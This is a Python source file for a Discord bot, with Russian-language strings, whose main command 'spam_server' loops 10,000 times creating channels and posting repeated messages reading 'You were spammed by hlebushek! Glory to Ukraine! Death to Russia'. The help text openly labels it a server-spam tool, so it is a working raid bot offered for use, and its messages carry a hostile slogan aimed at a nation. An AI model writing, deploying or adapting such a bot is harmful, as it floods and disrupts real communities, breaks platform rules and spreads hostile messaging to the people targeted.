import discord
from discord.ext import commands
from config import settings
import asyncio
import time

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix = settings['prefix'],  intents = intents)
client = commands.Bot(command_prefix = settings['prefix'],  intents = intents)
bot.remove_command('help')


@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.online, activity=discord.Game("Хороший бот"))
    print("Готов всех джага-джага")


@bot.command()
async def help(ctx):
    embed = discord.Embed(
    title = "Помощь по спаму",
    description = "`spam!spam_server - Спам сервера`",
    color = ''
    )
    ctx.send(embed=embed)
                    

@bot.command()
async def spam_server(ctx):
    for line2 in range(0 , 10000):
        guild = ctx.message.guild
        await guild.create_text_channel('сервер-заспамлен-by-hlebushek')
        await ctx.channel.send('''
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России
Вы были заспамлены by hlebushek! Слава Украине! Смерть России''')


@bot.command()
async def stop(ctx):
    await bot.change_presence(status=discord.Status.offline)
    raise SystemExit
bot.run(settings['token'])